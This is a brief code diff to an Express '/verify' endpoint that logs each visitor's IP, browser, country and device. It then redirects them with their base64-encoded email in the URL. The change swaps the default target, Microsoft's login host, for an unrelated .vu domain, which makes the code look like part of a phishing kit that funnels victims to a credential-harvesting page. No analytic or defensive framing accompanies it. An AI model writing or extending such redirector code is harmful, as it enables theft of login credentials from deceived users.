@@ -152,7 +152,7 @@ app.post('/verify', async (req, res) => {
             logVisitor(clientIp, ua, country, device);
             
             // Build the success redirect URL, attaching the email parameters
-            const baseUrl = process.env.REDIRECT_BASE_URL || 'https://login.microsoftonline.com';
+            const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
             const random_str = Math.random().toString(36).substring(2, 15);
             const finalBaseUrl = baseUrl + '/' + random_str + '/' + encodeURIComponent(emailB64);
             const urlObj = new URL(finalBaseUrl);
